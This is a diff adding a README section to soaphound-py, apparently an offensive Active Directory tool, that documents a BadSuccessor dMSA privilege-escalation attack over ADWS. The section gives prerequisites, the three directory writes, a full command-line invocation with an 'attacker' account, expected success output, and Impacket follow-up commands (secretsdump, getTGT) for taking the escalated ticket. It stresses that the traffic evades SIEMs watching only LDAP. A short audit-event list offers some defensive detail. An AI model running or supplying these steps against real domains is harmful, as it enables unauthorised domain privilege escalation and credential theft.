@@ -178,6 +178,104 @@ soaphound -dc dc-curse.jjk.local -k -c Stealth
 soaphound -d jjk.local -u yuji -dc adws.jjk.local -dc-ip kdc.jjk.local -k
 ```
 
+# BadSuccessor via ADWS
+
+Soaphound-py ships a CLI entry point for the BadSuccessor technique,
+based on the Akamai advisory by Yuval Gordon
+([blog post](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)).
+Everything the tool does over the wire goes through net.tcp:9389 (ADWS),
+so a SIEM that only watches LDAP:389 will not see the three AD writes
+involved.
+
+**Prerequisites**
+
+- An account with `Create Child` permission for the
+  `msDS-DelegatedManagedServiceAccount` object class on the target OU.
+- `Write Property` on both `msDS-ManagedAccountPrecededByLink` and
+  `msDS-DelegatedMSAState` on the created dMSA. Default `CREATOR OWNER`
+  inheritance does not grant these on hardened OUs; explicit WP
+  delegation (`dsacls /I:S /G <user>:WP;<attr>`) is often required.
+- The Distinguished Name of the AD principal to supersede.
+- At least one Windows Server 2025 Domain Controller in the forest.
+- ADWS reachable on `tcp/9389` on that DC.
+
+**Three ADWS writes**
+
+| # | Operation | Endpoint | Payload |
+|---|-----------|----------|---------|
+| 1 | WS-Transfer Create | `/Windows/ResourceFactory` | Creates the dMSA (`objectClass=msDS-DelegatedManagedServiceAccount`, `sAMAccountName`, `userAccountControl=4096`, `dNSHostName`, `msDS-ManagedPasswordInterval=30`, `msDS-DelegatedMSAState=0`) |
+| 2 | WS-Transfer Put | `/Windows/Resource` | Sets `msDS-ManagedAccountPrecededByLink` to the target DN |
+| 3 | WS-Transfer Put | `/Windows/Resource` | Sets `msDS-DelegatedMSAState` to `2` (migration completed) |
+
+**CLI**
+
+```
+soaphound \
+    -d jjk.local \
+    -u attacker \
+    -p 'password' \
+    -dc dc-curse.jjk.local \
+    -dc-ip 192.168.56.101 \
+    --badsuccessor \
+    --target 'CN=testVictim,CN=Users,DC=jjk,DC=local' \
+    --dmsa-cn badSuccessor \
+    --dmsa-ou 'OU=ControlledOU,DC=jjk,DC=local' \
+    [--dry-run] [--rollback]
+```
+
+`--dry-run` renders and logs the three SOAP payloads without sending
+them, useful for permission-matrix debugging. `--rollback` compensates
+a partial run by deleting the dMSA via WS-Transfer Delete; it does not
+require `--target`.
+
+**Expected output (happy path)**
+
+```
+[*] BadSuccessor via ADWS - target: CN=testVictim,CN=Users,DC=jjk,DC=local
+[+] Op 1/3 : dMSA created at CN=badSuccessor,OU=ControlledOU,DC=jjk,DC=local
+[+] Op 2/3 : msDS-ManagedAccountPrecededByLink set to CN=testVictim,CN=Users,DC=jjk,DC=local
+[+] Op 3/3 : msDS-DelegatedMSAState set to 2
+[+] Migration state = 2. dMSA is now ready to supersede target.
+```
+
+**Audit trail on the DC**
+
+With a SACL enabled on the target OU, the three writes generate:
+
+- 1x **Event 5137** - Directory Service Object Created (dMSA)
+- 2x **Event 5136** - Directory Service Object Modified (one per Put)
+
+**Kerberos handoff (external)**
+
+Once the three ADWS writes have landed, the dMSA is in the migration
+state 2 and ready to be used as a superseder. The remaining steps are
+performed with Impacket:
+
+```bash
+# 1. Recover the dMSA NT hash and AES256 key (requires DCSync-equivalent rights).
+secretsdump.py -just-dc-user 'badSuccessor$' \
+    -dc-ip 192.168.56.101 'jjk.local/Administrator:<AdminPass>@192.168.56.101'
+
+# 2. Ask the KDC for a TGT on behalf of the dMSA. Modern DCs often
+#    disable RC4, so pass the AES256 key rather than the NT hash.
+getTGT.py -dc-ip 192.168.56.101 -aesKey <AES256> 'jjk.local/badSuccessor$'
+
+# 3. Inspect the resulting ticket PAC.
+describeTicket.py --aes <krbtgt_AES256> 'badSuccessor$.ccache'
+```
+
+The KDC-side substitution that materialises the privilege escalation --
+where the resulting ticket carries the superseded principal's SIDs via
+the `KERB-DMSA-KEY-PACKAGE` or `DMSA_SUPERSEDED_ACCOUNT` PAC buffer --
+requires a Kerberos client that implements the dMSA-specific
+pre-authentication. On Windows, Rubeus `/dmsa` handles this. On Linux,
+Impacket 0.13 does not yet port the dMSA PA-DATA, so the Kerberos
+portion of the attack remains Windows-side tooling. Recent Windows
+Server 2025 cumulative updates may also harden the KDC against this
+substitution, in which case the Impacket-based path returns a plain
+ticket for the dMSA itself (visible in `describeTicket` as the dMSA's
+own `UserId` RID instead of the target's).
+
 # References
 
 - [Falcon Force Team](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/) for the initial inspiration.
